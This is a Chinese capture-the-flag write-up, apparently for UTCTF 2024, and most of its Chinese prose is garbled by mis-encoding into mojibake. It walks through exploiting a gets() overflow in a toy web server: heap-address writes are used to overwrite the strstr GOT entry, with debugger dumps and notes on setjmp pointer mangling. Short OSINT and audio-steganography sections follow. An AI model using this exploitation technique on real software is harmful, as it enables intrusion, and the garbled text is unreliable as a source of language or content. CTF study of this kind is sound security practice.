- æœ€åå†å¼ºè°ƒä¸€éï¼Œmainå‡½æ•°ç›´æ¥è°ƒç”¨exité€€å‡ºäº†ï¼Œæ²¡æœ‰retã€‚

#### æ¼æ´åˆ†æ
è¿™ä¸ªé¢˜çš„æ¼æ´å¾ˆæ˜æ˜¾ä½†å¾ˆéš¾åˆ©ç”¨ã€‚getsæ¯«æ— ç–‘é—®æ˜¯éå¸¸ç®€å•ç²—æš´çš„æ ˆæº¢å‡ºï¼Œä½†è¿™ä¸ªé¢˜mainå‡½æ•°æ²¡æœ‰è¿”å›è€Œæ˜¯ç›´æ¥è°ƒç”¨exitï¼Œæ‰€ä»¥ä¸èƒ½ROPã€‚å¦å¤–å› ä¸ºè¾“å‡ºæœºä¼šåªæœ‰ä¸€æ¬¡ï¼Œä¸å¯èƒ½leakå‡ºä»»ä½•ä¿¡æ¯ï¼ˆå †æ ˆåœ°å€ï¼Œfsæ®µï¼‰ã€‚æ­¤å¤–æ¶‰åŠå †çš„ä½¿ç”¨ç›¸å½“è§„èŒƒï¼Œæ²¡æœ‰å‘ç°ä»»ä½•æº¢å‡ºã€‚

è¯¦ç»†åˆ†æä¸€ä¸‹æ¶‰åŠgetsçš„éƒ¨åˆ†ï¼š

- å½“è¯»å–`gets`ä¸åŒ…å«`take_until_char`éœ€è¦çš„å­—ç¬¦æ—¶ï¼ˆé¦–è¡Œçš„ç©ºæ ¼ï¼Œheaderçš„å†’å·ï¼‰ï¼Œä¼šæŠŠgetsæœ¬èº«çš„EOFå¤„çš„ç©ºå­—èŠ‚ä½œä¸ºåˆ†éš”ç¬¦ï¼Œç»§ç»­åé¢å¤„ç†ã€‚è¿™æ ·å¯ä»¥åœ¨å¤„ç†headeræ—¶ï¼Œè®©valueä¸ºæ ˆä¸ŠåŸæœ¬å†…å®¹ä»è€Œæ³„éœ²æ ˆä¸Šå†…å®¹ï¼ˆä½†ä¸‹ä¸€æ¬¡è¿è¡Œå„ç§åœ°å€åç§»åˆä¸ä¸€æ ·äº†ï¼‰
- `gets`å¯ä»¥è¦†ç›–åˆ°setjmpè®¾ç½®çš„ä¸Šä¸‹æ–‡ï¼ˆé‡è¦çš„æ˜¯rsp, rbp, ripï¼Œä½†ä¸‰ä¸ªå¯„å­˜å™¨è¢«`fs:[0x30]`åŠ å¯†äº†ï¼Œä¹Ÿä¸èƒ½off-by-oneï¼‰ï¼Œæ‰€ä»¥å¦‚æœçŸ¥é“`fs:[0x30]`ï¼Œå¯ä»¥æ§åˆ¶`setjmp`çš„ç›®æ ‡åœ°å€ï¼Œé€šè¿‡æ‰‹åŠ¨è§¦å‘longjmpçš„æ–¹æ³•æ§åˆ¶æ‰§è¡Œæµã€‚

- `gets`å¯ä»¥è¦†ç›–åˆ°æ ˆä¸Šå­˜å‚¨`headers`æŒ‡é’ˆçš„å †åœ°å€ï¼Œ`header_cap`å’Œ`header_count`ã€‚headerséƒ¨åˆ†æ˜¯æˆ‘ä»¬è‡ªç”±åº¦æœ€å¤§çš„éƒ¨åˆ†ï¼Œä¸é™è¾“å…¥æ¬¡æ•°ä¸”æœ‰`headers[header_count] = h`è¿™æ ·çš„æ“ä½œï¼Œå…¶ä¸­å‰ä¸¤ä¸ªå˜é‡æˆ‘ä»¬å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºæ§åˆ¶ã€‚
  - å¯ä»¥off-by-nullï¼Œæ¯”å¦‚å¯ä»¥æœ‰1/16æ¦‚ç‡æˆåŠŸå¯¹tcacheè¿›è¡Œ`realloc`ã€‚
  - ä¸çŸ¥é“å †åŸºå€ï¼Œå¯ä»¥æŠŠå®ƒè¦†ç›–ä¸ºnullï¼Œé€šè¿‡reallocé‡ç½®headersï¼ˆåŒæ—¶ä¸¢å¤±å‰å‡ ä¸ªheadersçš„æŒ‡é’ˆï¼‰ï¼Œå¦‚æœè¿›debug_handleråº”è¯¥ä¼šå‡ºäº‹ï¼Œä½†æ˜¯è¿›fileserv_handlerä¸ä¼šå½±å“ã€‚
  - å·²çŸ¥å †åŸºå€ï¼Œæˆ–ç›´æ¥æŠŠheadersè¦†ç›–ä¸º0ï¼Œä¹Ÿå¯ä»¥åŒæ—¶æ”¹åé¢ä¸¤ä¸ªå˜é‡

- `gets`ä¼šå½±å“åˆ°method, path, versionã€‚ä½†æ˜¯å› ä¸ºå¯¹pathæ£€æŸ¥åœ¨åé¢ï¼Œæ‰€ä»¥è¿™é‡Œæå‰æ”¹äº†æ²¡ç”¨ã€‚

#### æˆ‘çš„è§£æ³•
æ ¸å¿ƒåœ¨äºheaderséƒ¨åˆ†å¤„ç†ï¼Œæ§åˆ¶`header_count + 1 <= header_cap`ï¼Œä¸è¦è¿›reallocåˆ†æ”¯ï¼Œæˆ‘ä»¬ä¼šè·å¾—å‘ä»»æ„åœ°å€å†™å…¥ä¸¤ä¸ªmallocå‡ºæ¥çš„å †åœ°å€çš„èƒ½åŠ›ã€‚ç‰¹åˆ«åœ°ï¼Œå› ä¸ºè¿™ä¸ªé¢˜æ²¡æœ‰PIEï¼Œæ‰€ä»¥ä¸éœ€è¦leakä»»ä½•ä¸œè¥¿ã€‚

ç›®æ ‡å¾ˆæ˜ç¡®ï¼Œæ˜¯åœ¨`path`èƒ½è¢«è§£æå‡º`./flag.txt`è¿™ä¸ªæ–‡ä»¶çš„å‰æä¸‹ï¼Œè®©`handler`è°ƒç”¨çš„æ˜¯`fileserv_handler`ï¼Œ`debug_handler`æ²¡æœ‰ä»»ä½•ç”¨å¤„ã€‚è€Œåˆ¤æ–­æ˜¯å¦ä½¿ç”¨fileserv_handlerçš„æ¡ä»¶æ˜¯`strstr(path, "flag.txt") == NULL`ã€‚è™½ç„¶æ­£å¸¸æ¥è¯´æˆ‘ä»¬getså¹²æ‰°ä¸åˆ°è¿™é‡Œçš„åˆ¤æ–­ï¼Œä½†æ˜¯å¦‚æœèƒ½æŠŠ`strstr`çš„GOTè¡¨æ”¹æ‰ï¼Œè®©è¿™é‡Œè¿”å›NULLï¼Œå°±å¯ä»¥è¿›å…¥`fileserv_handler`åˆ†æ”¯ï¼Œè¾¾æˆæ”»å‡»ã€‚

ç¨‹åºçš„GOTè¡¨éƒ¨åˆ†ï¼š
```log
[0x4050d0] fdopendir@GLIBC_2.4 -> 0x4011a0 â—‚â€” endbr64
[0x4050d8] exit@GLIBC_2.2.5 -> 0x4011b0 â—‚â€” endbr64
[0x4050e0] strstr@GLIBC_2.2.5 -> 0x4011c0 â—‚â€” endbr64
```
å¯ä»¥çœ‹åˆ°`strstr`å¤„äºGOTè¡¨æœ«å°¾ã€‚è¿™å¯¹æˆ‘ä»¬æ˜¯æœ‰åˆ©çš„ï¼Œå› ä¸ºæˆ‘ä»¬è™½ç„¶èƒ½å‘ä»»æ„åœ°å€å†™ï¼Œä½†å†™å…¥çš„å†…å®¹è¢«mallocå‡ºæ¥çš„ä¸¤ä¸ªå †åœ°å€ï¼Œæ˜¯é«˜åº¦ä¸å¯æ§çš„ã€‚å› æ­¤æˆ‘ä»¬åªèƒ½ä¸€æ¬¡åˆ©ç”¨å†™å…¥å†…å®¹çš„é«˜ä½æˆ–ä½ä½æ”¹å†™GOTè¡¨çš„éƒ¨åˆ†å†…å®¹ï¼Œè¿™ä¸å¯é¿å…ä¼šå†™åˆ°å…¶ä»–GOTè¡¨å†…å®¹ï¼Œå¥½åœ¨ç›¸é‚»çš„å‡½æ•°éƒ½æ˜¯ä¸ä¼šè¢«è°ƒç”¨çš„ã€‚

æœ€å®¹æ˜“æƒ³åˆ°çš„æ€è·¯æ˜¯ï¼Œä»0x4050d1å†™å…¥headerï¼ŒæŠŠç¬¬äºŒä¸ªmallocåœ°å€çš„é«˜ä½ï¼ˆ0ï¼‰ç»™off-by-nullè¿›GOTè¡¨æœ€ä½ä½ï¼Œæ„æˆ0x401100ã€‚ä½†æ˜¯è¿™æ ·ä¼šæŠ¥æ®µé”™è¯¯ã€‚

å¦ä¸€ä¸ªæ€è·¯å°±æ˜¯åˆ©ç”¨ä½ä½ã€‚è¿™æ—¶æˆ‘ä»¬å†å›æƒ³ä¸€ä¸‹æˆ‘ä»¬å†™å…¥çš„åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿ

```c
int index = 0;
char *name = take_until_char(header_line, &index, ':');
char *value = take_until_newline(header_line, &index);
name = malloc_str(name);
value = malloc_str(value);

...

struct Header h;
h.name = name;
h.value = value;
headers[header_count] = h;
```
æ˜¯mallocå‡ºæ¥çš„å †åœ°å€ï¼Œæ˜¯å †å—åœ°å€+0x10ã€‚å› ä¸ºç¬¬ä¸€ä¸ªå †å—ï¼ˆä¹Ÿå°±æ˜¯tcacheï¼‰æ˜¯é¡µå¯¹é½çš„ï¼ˆæœ€åä¸‰ä½æ˜¯000ï¼‰ï¼Œæ‰€æœ‰mallocå¾—åˆ°çš„åœ°å€ï¼Œä½ä½ï¼ˆç¬¬ä¸€ä¸ªå­—èŠ‚ï¼‰éƒ½æ˜¯`X0`ã€‚å¹¶ä¸”å› ä¸ºæ¯æ¬¡å¾ªç¯å›ºå®šå°±è¿™ä¸¤æ¬¡`malloc`ï¼Œå¤§å°å¯ä»¥ç”±æˆ‘ä»¬è¾“å…¥çš„headeræ§åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬äº‹å®ä¸Šå¯ä»¥æ§åˆ¶å†™å…¥çš„ç¬¬ä¸€å­—èŠ‚ã€‚è€ŒGOTè¡¨é¡¹åœ¨åˆå§‹åŒ–å‰ï¼Œæ˜¯æŒ‡å‘PLTè¡¨çš„ï¼Œå†…å®¹ä»`0x401000`å¼€å§‹ï¼Œæ¯é¡¹å ç”¨`0x10`çš„èŒƒå›´ã€‚å› æ­¤ï¼Œè‡³å°‘å¯¹äº`0x401000-0x4010f0`è¿™äº›è¡¨é¡¹ï¼Œæ¯ä¸ªå­—èŠ‚éƒ½å¯ä»¥è¢«æˆ‘ä»¬å†™å…¥ã€‚å› æ­¤æˆ‘ä»¬åªéœ€è¦è®©ä»`0x4050e0, 0x4050e1,...,0x4050e7`é”™ä½8è½®ï¼Œæ¯è½®å†™å…¥ä¸€ä¸ªæœ€ä½ä½ï¼Œå°±å¯ä»¥æŠŠGOTè¡¨æ”¹å†™ä¸ºç›®æ ‡å€¼äº†ã€‚

æ»¡è¶³`0x4010X0`æ ¼å¼çš„PLTè¡¨é¡¹ï¼š
```log
pwndbg> x/16gx 0x405000
0x405000:       0x0000000000404e20      0x00007f230b9d6190
0x405010:       0x00007f230b9bfbc0      0x0000000000401030
0x405020 <strcasecmp@got.plt>:  0x0000000000401040      0x0000000000401050
0x405030 <strncmp@got.plt>:     0x0000000000401060      0x00007f230b93ce40
0x405040 <puts@got.plt>:        0x0000000000401080      0x0000000000401090
0x405050 <strlen@got.plt>:      0x00007f230b93b900      0x00000000004010b0
0x405060 <close@got.plt>:       0x00000000004010c0      0x00000000004010d0
0x405070 <_setjmp@got.plt>:     0x00007f230b7f5c80      0x00007f230b936df0
pwndbg> x/16gx 0x405008
0x405008:       0x00007f230b9d6190      0x00007f230b9bfbc0
0x405018 <free@got.plt>:        0x0000000000401030      0x0000000000401040
0x405028 <strncpy@got.plt>:     0x0000000000401050      0x0000000000401060
0x405038 <strcpy@got.plt>:      0x00007f230b93ce40      0x0000000000401080
0x405048 <fread@got.plt>:       0x0000000000401090      0x00007f230b93b900
0x405058 <printf@got.plt>:      0x00000000004010b0      0x00000000004010c0
0x405068 <closedir@got.plt>:    0x00000000004010d0      0x00007f230b7f5c80
0x405078 <strcmp@got.plt>:      0x00000000004010f0      0x0000000000401100
```
å¦å¤–æˆ‘ä»¬è¿˜éœ€è¦`strstr(path, "flag.txt") == NULL`ï¼Œå¹¶ä¸”å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­ä¸èƒ½åŠ¨`path`çš„å†…å®¹ï¼ˆæ’é™¤`free`, `strcpy`ï¼‰ã€‚æ­£å¼ç¼–å†™ç¨‹åºå‰å¯ä»¥gdbé‡Œå…ˆ`set *(long*)0x4050e0 = 0x401090`è¿™æ ·å…ˆæ‰‹åŠ¨æ”¹å¥½ã€‚ç»è¿‡è°ƒè¯•ï¼Œè°ƒç”¨è¿™ä¸ªå‡½æ•°æ—¶`rdx==0` ï¼ˆä¸èƒ½content-length=0ï¼Œå¦åˆ™rdxåº”è¯¥ä¼šè¢«æ”¹ä¸º1ï¼‰ï¼Œå› æ­¤`fread`å’Œ`strncmp`æ˜¯å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹çš„ã€‚

[exp](webserver/exp.py) 

flag: `utflag{an_educational_experience}`

> ä¸è¿‡è¿™ä¸ªflagæˆ‘æœ¬åœ°è·‘ä¸é€šï¼Œç ”ç©¶äº†ä¸€ä¸‹å‘ç°äº†ä¸¤ä¸ªé—®é¢˜ï¼š
> - sendfileé‚£é‡Œï¼Œout_fdä¼ æˆ0äº†ã€‚ä¹Ÿè®¸è¿œç¨‹ç¯å¢ƒä¸‹0å’Œ1ä¸å½±å“ï¼Œä½†æ˜¯æœ¬åœ°è°ƒè¯•0æ˜¯stdinï¼Œå¾€è¿™é‡Œè¾“å‡ºè‡ªç„¶æ˜¯çœ‹ä¸åˆ°çš„ã€‚
> - ç¨‹åºæœ€åä¼šå› ä¸ºheap corruptedè€Œæ— æ³•æ­£å¸¸é€€å‡ºï¼Œå› ä¸ºæˆ‘ä»¬è¦†ç›–header_countæ—¶é¡ºä¾¿è¦†ç›–äº†versionçš„æœ€ä½ä½ä¸º00ï¼Œæ‰€æœ‰æœ€åcleanupæ—¶`free(version)`ä¼šæŠ¥é”™ï¼Œä¹Ÿæ˜¯å¯ä»¥ä¿®çš„ï¼Œå¤šè¾“å‡º7ä¸ªç©ºå­—èŠ‚ï¼Œ`free(0)`æ˜¯ä¸ä¼šæŠ¥é”™çš„ã€‚å¦å¤–`headers`æœ€åä¹Ÿéœ€è¦é‡ç½®ä¸º0æˆ–è€…ä¸€ä¸ªåˆæ³•çš„å †åœ°å€ã€‚å½“ç„¶è¿™ä¸ªæ˜¯æ¬¡è¦åŸå› ï¼Œåªæ˜¯ä¸ºäº†è®©ç¨‹åºæ­£å¸¸é€€å‡ºè€Œå·²ã€‚

#### å…¶ä»–æ€è€ƒ
- è¿™ä¸ªé¢˜ä¸æ˜¯å †é¢˜ï¼Œå †çš„ä½¿ç”¨éƒ½éå¸¸è§„èŒƒå¹¶ä¸”æ— æ³•è‡ªç”±åœ°è¿›è¡Œå†™å…¥ï¼ˆå†™å…¥å†…å®¹é«˜åº¦ä¸å¯æ§ï¼‰å’Œfreeï¼ˆæœ‰å¤§é‡reallocè¿™ç§æ¯”è¾ƒå¤æ‚çš„æ“ä½œï¼‰ã€‚å› æ­¤æµªè´¹äº†å¤§é‡æ—¶é—´åœ¨æ½œåœ¨å †åˆ©ç”¨ï¼Œæ¯”å¦‚ç©tcacheå’Œreallocã€‚äº‹å®ä¸Šæœ€ç»ˆexpæ˜¯å®Œå…¨å›é¿äº†ä¸å¿…è¦çš„reallocçš„ã€‚
- æ¶‰åŠmax, minå®ï¼ˆ`content_length > max_length ? max_length : content_length`ï¼‰åº”è¯¥æ³¨æ„åˆ°æ•´æ•°æº¢å‡ºé—®é¢˜ï¼Œæ˜¯å¦æ¥å—è´Ÿæ•°ï¼ˆè™½ç„¶è¿™ä¸ªé¢˜æ²¡ç”¨ä¸Šï¼‰ã€‚
- è¿™ä¸ªé¢˜æ¯”è¾ƒå¥½çš„æ€è€ƒæ–¹å¼æ˜¯ï¼Œgetsè·å¾—ç¼“å†²åŒºæº¢å‡ºåï¼Œæœ‰å“ªäº›æ˜¯çœŸæ­£æ„ä¹‰ä¸Šè¢«æˆ‘ä»¬æ§åˆ¶çš„å˜é‡ï¼ˆåç»­ç›´æ¥ä½¿ç”¨äº†å€¼è€Œéé‡æ–°èµ‹å€¼åä½¿ç”¨çš„ï¼‰ï¼Œè¿™äº›å˜é‡äº’ç›¸ç»„åˆèƒ½äº§ç”Ÿä»€ä¹ˆæ•ˆæœã€‚å¦‚æœä¸€å¼€å§‹å°±æ³¨æ„åˆ°`headers[header_count] = h`ï¼Œå¯èƒ½åé¢æ•´ä¸ªæ€è·¯éƒ½æ˜¯æ¯”è¾ƒè‡ªç„¶çš„ã€‚
- è¿™ä¸ªé¢˜resolve_pathç›¸å½“æ— æ‡ˆå¯å‡»ï¼ˆå’Œå †åˆ©ç”¨æ¯”è¾ƒè§„èŒƒæœ‰å…³ï¼‰ï¼Œè€Œä¸”åç»­å‡ ä¹æ²¡æœ‰å¯æ§è¾“å…¥ï¼Œåè€Œåœ¨å…¥å£å¤„ï¼ˆstrstrï¼‰çš„åˆ¤æ–­éå¸¸è„†å¼±ã€‚å…¶å®æ³¨æ„åˆ°ä»»æ„å†™ï¼Œåˆ°æ”¹å†™strstrçš„gotè¡¨è¿™æ­¥åº”è¯¥æ˜¯å¾ˆå®¹æ˜“æƒ³åˆ°çš„ã€‚
- æœ€åï¼Œè®°ä¸€ä¸‹ç¬”è®°ï¼Œè¿™ç§ç”¨mallocå‡ºæ¥çš„åœ°å€ä½ä½ä¸€ç‚¹ä¸€ç‚¹è¹­ï¼Œè¹­å‡ºä»»æ„å€¼çš„æ€è·¯ä¹‹å‰ç”¨çš„å°‘ã€‚

- å…¶ä»–è¯•é”™è¿‡ç¨‹å­¦åˆ°çš„ä¸œè¥¿
  - æ²¡æœ‰è°ƒç”¨setbufæ—¶ï¼Œgetsä¼šåœ¨å †ä¸Šå»ºç«‹ä¸€ä¸ª0x1000ï¼ˆchunk_size=0x1010ï¼‰çš„ç¼“å†²åŒºï¼ŒæŠŠæ‰€æœ‰è¾“å…¥ç¼“å†²è¿›æ¥ã€‚ç†è®ºä¸Šï¼Œå¾ªç¯æ“ä½œæ—¶æ”¹ç¼“å†²åŒºå¯ä»¥åšåˆ°åŠ¨æ€è°ƒæ•´åç»­è½®æ¬¡è¾“å…¥çš„ä½œç”¨ã€‚å¯èƒ½å¯ä»¥ç”¨äºåœ¨æ²¡æœ‰è¾“å‡ºæ—¶ï¼Œåœ¨åç»­è¾“å…¥ç”¨åˆ°å†…éƒ¨åœ°å€ï¼ˆè¿˜æ˜¯å¾ˆéš¾ç”¨ï¼‰
  - setjmp/longjmpï¼Œçœ‹ä¸‹é¢ã€‚åˆ©ç”¨éš¾åº¦å’Œç»•è¿‡canaryå·®ä¸å¤š
  - .commentsæ®µä¼¼ä¹ä¼šå¸¦ç¼–è¯‘å™¨ç‰ˆæœ¬ä¿¡æ¯ï¼Œæ¯”å¦‚è¿™ä¸ªé¢˜æˆ‘çœ‹åˆ°æ˜¯Ubuntu20.04çš„GCCï¼Œæ‰€ä»¥libcå¤§æ¦‚ç‡æ˜¯2.31ã€‚

#### å…³äºsetjmp/longjmp
ç¨å¾®å­¦ä¹ äº†ä¸€ä¸‹ï¼Œè¿™ä¸ªæ˜¯Cè¯­è¨€ä¸­å¼‚å¸¸å¤„ç†æœºåˆ¶ã€‚è°ƒç”¨setjmpæ—¶ï¼Œç›´æ¥è¿”å›0ã€‚ä½†æ˜¯å½“åç»­è°ƒç”¨longjmpæ—¶ï¼Œå¯ä»¥è·¨è¶Šå‡½æ•°ç›´æ¥è·³è½¬åˆ°è°ƒç”¨setjmpæ—¶çš„åœ°æ–¹ï¼Œå¹¶ä¸”ä½¿å¾—æ­¤æ—¶çš„è¿”å›å€¼ä¸ºæŒ‡å®šå€¼ï¼ˆå½“ç„¶ä¸èƒ½æ˜¯0ï¼Œä¸ç„¶æ— æ³•å’Œç¬¬ä¸€æ¬¡è°ƒç”¨setjmpæ—¶åŒºåˆ†ï¼‰ã€‚

å¯ä»¥çœ‹è¿™ä¸ªç¤ºä¾‹ä»£ç ã€‚

```c
#include <stdio.h>
#include <setjmp.h>

static jmp_buf buf;

void second(void) {
    printf("second\n");         // æ‰“å°
    longjmp(buf,1);             // è·³å›setjmpçš„è°ƒç”¨å¤„ - ä½¿å¾—setjmpè¿”å›å€¼ä¸º1
}

void first(void) {
    second();
    printf("first\n");          // ä¸å¯èƒ½æ‰§è¡Œåˆ°æ­¤è¡Œ
}

int main() {   
    if ( ! setjmp(buf) ) {
        first();                // è¿›å…¥æ­¤è¡Œå‰ï¼Œsetjmpè¿”å›0
    } else {                    // å½“longjmpè·³è½¬å›ï¼Œsetjmpè¿”å›1ï¼Œå› æ­¤è¿›å…¥æ­¤è¡Œ
        printf("main\n");       // æ‰“å°
    }

    return 0;
}
```

è¿™é‡Œçš„æ ¸å¿ƒåœ¨è¿™ä¸ª`jmp_buf`ç»“æ„ä½“ï¼Œå‚è€ƒ[è¿™ç¯‡åšå®¢](https://www.hitzhangjie.pro/blog/2017-03-27-jmp_bufsetjmplongjmp/)ï¼Œx64ä¸‹è¿™ä¸ªç»“æ„ä½“æ˜¯ï¼š
```c
// defined in linux kernel
struct __jmp_buf {
 unsigned long __rbx; // é€šç”¨æ•°æ®å¯„å­˜å™¨ä¹‹ä¸€
 unsigned long __rsp; // æ ˆæŒ‡é’ˆå¯„å­˜å™¨
 unsigned long __rbp; // åŸºå€æŒ‡é’ˆå¯„å­˜å™¨
 unsigned long __r12;
 unsigned long __r13;
 unsigned long __r14;
 unsigned long __r15;
 unsigned long __rip;
};

typedef struct __jmp_buf jmp_buf[1];

// redefined in glibc
struct __jmp_buf_tag
{
 /* NOTE: The machine-dependent definitions of `__sigsetjmp'
 assume that a `jmp_buf' begins with a `__jmp_buf' and that
 `__mask_was_saved' follows it. Do not move these members
 or add others before it. */
 __jmp_buf __jmpbuf; /* Calling environment. */
 int __mask_was_saved; /* Saved the signal mask? */
 __sigset_t __saved_mask; /* Saved signal mask. */
};
typedef struct __jmp_buf_tag jmp_buf[1];
```

çœ‹èµ·æ¥`jmp_buf`çš„å‰8ä¸ªqwordå°±æ˜¯rbx,rsp,rbp,r12-r15,ripè¿™äº›å¯„å­˜å™¨çš„å€¼ã€‚ä½†æ˜¯äº‹å®ä¸Šæ²¡è¿™ä¹ˆç®€å•ï¼Œæ¯”å¦‚çœ‹ä¸‹é¢çš„gdbè°ƒè¯•æ–­ç‚¹çš„æ±‡ç¼–ï¼š
```c
// ../sysdeps/x86_64/__longjmp.S
0x7ffff7dc9290 <__longjmp>                   endbr64 
0x7ffff7dc9294 <__longjmp+4>                 mov    r8, qword ptr [rdi + 0x30]
0x7ffff7dc9298 <__longjmp+8>                 mov    r9, qword ptr [rdi + 8]
0x7ffff7dc929c <__longjmp+12>                mov    rdx, qword ptr [rdi + 0x38]
0x7ffff7dc92a0 <__longjmp+16>                ror    r8, 0x11
0x7ffff7dc92a4 <__longjmp+20>                xor    r8, qword ptr fs:[0x30]
0x7ffff7dc92ad <__longjmp+29>                ror    r9, 0x11
0x7ffff7dc92b1 <__longjmp+33>                xor    r9, qword ptr fs:[0x30]
0x7ffff7dc92ba <__longjmp+42>                ror    rdx, 0x11
0x7ffff7dc92be <__longjmp+46>                xor    rdx, qword ptr fs:[0x30]
0x7ffff7dc92c7 <__longjmp+55>                test   dword ptr fs:[0x48], 2
0x7ffff7dc92d3 <__longjmp+67>                je     __longjmp+113                <__longjmp+113>
â†“
0x7ffff7dc9301 <__longjmp+113>               nop    
0x7ffff7dc9302 <__longjmp+114>               mov    rbx, qword ptr [rdi]
0x7ffff7dc9305 <__longjmp+117>               mov    r12, qword ptr [rdi + 0x10]
0x7ffff7dc9309 <__longjmp+121>               mov    r13, qword ptr [rdi + 0x18]
0x7ffff7dc930d <__longjmp+125>               mov    r14, qword ptr [rdi + 0x20]
0x7ffff7dc9311 <__longjmp+129>               mov    r15, qword ptr [rdi + 0x28]
0x7ffff7dc9315 <__longjmp+133>               mov    eax, esi
0x7ffff7dc9317 <__longjmp+135>               mov    rsp, r8
0x7ffff7dc931a <__longjmp+138>               mov    rbp, r9
0x7ffff7dc931d <__longjmp+141>               nop    
0x7ffff7dc931e <__longjmp+142>               jmp    rdx
=============
0   0x7ffff7dc9290 __longjmp
1   0x7ffff7dc9222 siglongjmp+50
2         0x402244 main+349
3   0x7ffff7db0d90 __libc_start_call_main+128
4   0x7ffff7db0e40 __libc_start_main+128
5         0x40139e _start+4

```
å¯è§å®é™…ä¸Šæ˜¯åŒ…å«ä¸€ä¸ª`ror 11`ï¼ˆå¾ªç¯ç§»ä½ï¼‰ï¼Œä¸`fs:[0x30]`å¼‚æˆ–çš„è¿‡ç¨‹çš„ï¼Œè¿™è¢«ç§°ä¸ºæŒ‡é’ˆä¿æŠ¤ï¼Œä¿æŠ¤çš„å°±æ˜¯å¯¹æ§åˆ¶æµéå¸¸æ•æ„Ÿçš„`rsp, rbp, rip`ã€‚å› è€Œåœ¨æ— æ³•æ³„éœ²`fs:[0x30]`çš„å‰æä¸‹ï¼Œæˆ‘ä»¬æ—¢ä¸èƒ½ç›´æ¥ä¿®æ”¹æŒ‡é’ˆå†…å®¹ï¼Œä¹Ÿä¸èƒ½é€šè¿‡off-by-one ripæŒ‡é’ˆçš„ä½ç½®ã€‚


## å­¦ä¹ å…¶ä»–é€‰æ‰‹WP
### Forensics: OSINT3
å‚è€ƒï¼š[https://warlocksmurf.github.io/posts/utctf2024/#osint-3-forensics](https://warlocksmurf.github.io/posts/utctf2024/#osint-3-forensics)

> æ‰¾åˆ°Cole Minertonçš„IPåœ°å€

ä¹‹å‰æåˆ°linktreeé‡Œæ˜¯æœ‰ä¸€ä¸ª[reddit](https://old.reddit.com/user/coleminerton)åœ°å€çš„ï¼Œä¼šæŠŠæˆ‘ä»¬å¸¦åˆ°old redditä¸»é¡µã€‚åœ¨Youtubeè§†é¢‘è¯„è®ºåŒºé‡Œï¼ŒCMæåˆ°è‡ªå·±è®¡åˆ’é€Ÿé€šä¸€ä¸‹Tiny Island Survivalè¿™æ¬¾æ¸¸æˆï¼Œè€Œreddité‡Œæåˆ°ä»–åœ¨è¿™ä¸ªæ¸¸æˆçš„sub redditæ¿å—è¢«æå‡ä¸ºmodï¼ˆç®¡ç†å‘˜ï¼‰ã€‚å¯ä»¥æ‰¾åˆ°è¿™ä¸ªsubredditçš„[moderatoré¡µé¢](https://old.reddit.com/r/tinyislandsurvival/about/moderators)

å³ä¸‹è§’å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªWIPä¸­çš„Tiny Island Survivalçš„Wikiï¼Œç‚¹è¿›å»æ˜¯ä¸€ä¸ªFandomçš„[Wikié¡µé¢](https://tiny-island-survival.fandom.com/wiki/Tiny_Island_Survival_Wiki)ã€‚

å¾ˆæ˜æ˜¾è¿™ä¸ªWikiåº”è¯¥æ˜¯CMæœ¬äººç»´æŠ¤çš„äº†ï¼Œæ‰¾ä¸€æ‰¾ç¼–è¾‘è®°å½•ï¼Œå¾ˆå®¹æ˜“èƒ½æ‰¾åˆ°ä¸€æ¬¡ç¼–è¾‘ä¸­CMå¿˜äº†ç™»å½•å¸å·äº†ï¼Œé‚£fandomå°±ä¼šè®°å½•å®ƒæ­¤æ—¶çš„IPåœ°å€å†™å…¥ç¼–è¾‘å†å²è®°å½•é‡Œï¼Œäºæ˜¯æˆ‘ä»¬å°±æ‰¾åˆ°äº†ä»–çš„IPæ˜¯`181.41.206.31`

![](osint_pic/osint_fandom_nologin.png)


### Forensics: Chippy Music
å‚è€ƒï¼š[https://warlocksmurf.github.io/posts/utctf2024/#study-music-forensics](https://warlocksmurf.github.io/posts/utctf2024/#study-music-forensics)

è¯„ä»·ä¸ºï¼šAdobe Auditionä¸è¡Œï¼ŒAudacityæ˜¯éŸ³é¢‘éšå†™å”¯ä¸€æŒ‡å®šåˆ†æå·¥å…·ã€‚

æˆ‘å¡åœ¨äº†ä¸€ä¸ªå¾ˆå°´å°¬çš„åœ°æ–¹ï¼Œè¦æŠŠ`yt-dlp`ä¸‹è½½çš„éŸ³é¢‘å¯¼å…¥audacityï¼Œé¦–å…ˆéœ€è¦å®‰è£…FFMPEGä¾èµ–ï¼Œä½†æˆ‘å½“æ—¶ä¸€ç›´æ²¡å®‰è£…æˆåŠŸï¼Œå°±æƒ³ç€ï¼Œåæ­£AuditionåŠŸèƒ½åº”è¯¥æ›´å¼ºï¼Œè·å¾—çš„ä¿¡æ¯åº”è¯¥æ²¡ä»€ä¹ˆå˜åŒ–å§ã€‚

ä»Šå¤©æˆ‘ç»ˆäºå®‰è£…äº†audacityç‰¹ä¾›ç‰ˆFFMPEGï¼ˆå’±ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆgithubç›´æ¥ä¸‹è½½çš„buildå°±æ˜¯ä¸è¡Œï¼Œå¯èƒ½å¤ªæ–°äº†ï¼‰ï¼ŒæŠŠ10å°æ—¶è¶…é•¿éŸ³é¢‘å¯¼å…¥audacityï¼Œç­‰5åˆ†é’ŸåŠ è½½å®Œåï¼Œèµ«ç„¶çœ‹åˆ°ä¸­é—´æœ‰ä¸€å¤„å³°å€¼é«˜åº¦ä¸ä¸€æ ·ï¼ˆå°–åˆºçŠ¶ï¼‰ï¼Œæœæ–­ç”¨ffmpegåˆ‡å‡ºæ¥ï¼š`ffmpeg -i ./Chippy\ Music\ \[1Cbaa6dO2Yk\].m4a -ss 03:14:15 -t 00:00:35 ./chippy_clip.m4a`

ç„¶åæˆ‘è¿˜ä¸“é—¨æ‰“å¼€Auditionçœ‹äº†ä¸€ä¸‹ï¼Œæ¯›éƒ½æ²¡æœ‰ï¼Œä¼°è®¡æ˜¯å³°å€¼å½’ä¸€åŒ–äº†å§ï¼Œå¯è¿˜è¡Œï¼Ÿè¿™è¿˜æ€ä¹ˆåšéšå†™ï¼Ÿ

